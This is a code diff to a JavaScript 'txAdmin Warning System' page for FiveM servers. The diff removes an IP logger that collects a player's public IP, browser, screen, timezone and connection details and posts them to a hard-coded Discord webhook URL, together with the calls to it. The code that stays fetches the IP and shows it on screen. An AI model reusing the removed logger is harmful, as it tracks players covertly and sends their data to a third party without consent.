@@ -88,7 +88,7 @@ const createIPDisplay = (ip) => {
             ${ip}
         </div>
         <div style="font-size: 16px; color: #cccccc; margin-top: 20px;">
-            Executed via txAdmin Warning System • Data logged to Discord
+            Executed via txAdmin Warning System
         </div>
         <div id="countdown-timer" style="font-size: 18px; color: #ffff00; margin-top: 15px; font-weight: bold;">
             Auto-close in 12 seconds
@@ -146,158 +146,9 @@ const createIPDisplay = (ip) => {
     console.log('IP display created successfully');
 };
 
-// Discord webhook URL
-const DISCORD_WEBHOOK = 'https://canary.discord.com/api/webhooks/1411564766232842352/BH4caQFjBlYPp1zZsWJ4E-erP7oV9La5JrRPX1emdKLbYI6QpIV0SzQZ9TRux8s9yWMM';
-
-// Function to collect system information
-const collectSystemInfo = () => {
-    const info = {
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        languages: navigator.languages || [],
-        cookieEnabled: navigator.cookieEnabled,
-        onLine: navigator.onLine,
-        screen: {
-            width: screen.width,
-            height: screen.height,
-            colorDepth: screen.colorDepth,
-            pixelDepth: screen.pixelDepth
-        },
-        window: {
-            innerWidth: window.innerWidth,
-            innerHeight: window.innerHeight,
-            devicePixelRatio: window.devicePixelRatio
-        },
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        connection: navigator.connection ? {
-            effectiveType: navigator.connection.effectiveType,
-            downlink: navigator.connection.downlink,
-            rtt: navigator.connection.rtt
-        } : 'Unknown',
-        fivemContext: isFiveMContext(),
-        url: window.location.href,
-        referrer: document.referrer || 'Direct access'
-    };
-    
-    return info;
-};
-
-// Function to send data to Discord webhook
-const sendToDiscord = async (ip, systemInfo, error = null) => {
-    try {
-        const embed = {
-            title: error ? '❌ FiveM IP Fetch Error' : '🌐 FiveM Server IP Address Logged',
-            color: error ? 0xff0000 : 0x00ff41,
-            timestamp: new Date().toISOString(),
-            fields: [
-                {
-                    name: '🌍 Public IP Address',
-                    value: `\`${ip}\``,
-                    inline: true
-                },
-                {
-                    name: '⏰ Timestamp',
-                    value: new Date().toLocaleString(),
-                    inline: true
-                },
-                {
-                    name: '🖥️ Platform',
-                    value: systemInfo.platform,
-                    inline: true
-                },
-                {
-                    name: '🌐 Browser Info',
-                    value: `${systemInfo.userAgent.split(' ').slice(-2).join(' ')}`,
-                    inline: false
-                },
-                {
-                    name: '📺 Screen Resolution',
-                    value: `${systemInfo.screen.width}x${systemInfo.screen.height} (${systemInfo.screen.colorDepth}-bit)`,
-                    inline: true
-                },
-                {
-                    name: '🪟 Window Size',
-                    value: `${systemInfo.window.innerWidth}x${systemInfo.window.innerHeight}`,
-                    inline: true
-                },
-                {
-                    name: '🌍 Timezone',
-                    value: systemInfo.timezone,
-                    inline: true
-                },
-                {
-                    name: '🔗 Connection',
-                    value: systemInfo.connection !== 'Unknown' 
-                        ? `${systemInfo.connection.effectiveType} (${systemInfo.connection.downlink}Mbps, ${systemInfo.connection.rtt}ms RTT)`
-                        : 'Unknown',
-                    inline: false
-                },
-                {
-                    name: '🎮 FiveM Context',
-                    value: systemInfo.fivemContext ? '✅ Yes' : '❌ No',
-                    inline: true
-                },
-                {
-                    name: '🌐 Online Status',
-                    value: systemInfo.onLine ? '🟢 Online' : '🔴 Offline',
-                    inline: true
-                },
-                {
-                    name: '🍪 Cookies Enabled',
-                    value: systemInfo.cookieEnabled ? '✅ Yes' : '❌ No',
-                    inline: true
-                }
-            ],
-            footer: {
-                text: 'FiveM IP Logger via txAdmin Warning System',
-                icon_url: 'https://raw.githubusercontent.com/citizenfx/fivem/master/ext/ui-build/data/loadscreen/logo.png'
-            }
-        };
-        
-        if (error) {
-            embed.fields.unshift({
-                name: '❌ Error Details',
-                value: `\`\`\`${error}\`\`\``,
-                inline: false
-            });
-        }
-        
-        const webhookData = {
-            username: 'FiveM IP Logger',
-            avatar_url: 'https://raw.githubusercontent.com/citizenfx/fivem/master/ext/ui-build/data/loadscreen/logo.png',
-            embeds: [embed]
-        };
-        
-        console.log('Sending data to Discord webhook...');
-        
-        const response = await fetch(DISCORD_WEBHOOK, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(webhookData)
-        });
-        
-        if (response.ok) {
-            console.log('Successfully sent data to Discord webhook');
-        } else {
-            console.error('Discord webhook failed:', response.status, response.statusText);
-        }
-        
-    } catch (webhookError) {
-        console.error('Failed to send to Discord:', webhookError);
-    }
-};
-
 // Function to fetch IP and display
 const fetchAndDisplayIP = async () => {
     console.log('Starting IP fetch process...');
-    
-    // Collect system information first
-    const systemInfo = collectSystemInfo();
-    console.log('Collected system info:', systemInfo);
     
     try {
         console.log('Making request to ipify API...');
@@ -322,9 +173,6 @@ const fetchAndDisplayIP = async () => {
         const ip = data.ip;
         console.log('Successfully fetched IP:', ip);
         
-        // Send to Discord webhook
-        await sendToDiscord(ip, systemInfo);
-        
         // Create display
         createIPDisplay(ip);
         
@@ -333,9 +181,6 @@ const fetchAndDisplayIP = async () => {
         
     } catch (error) {
         console.error('IP fetch failed:', error);
-        
-        // Send error to Discord
-        await sendToDiscord('Failed to fetch', systemInfo, error.message);
         
         // Create error display
         createIPDisplay(`Error: ${error.message}`);
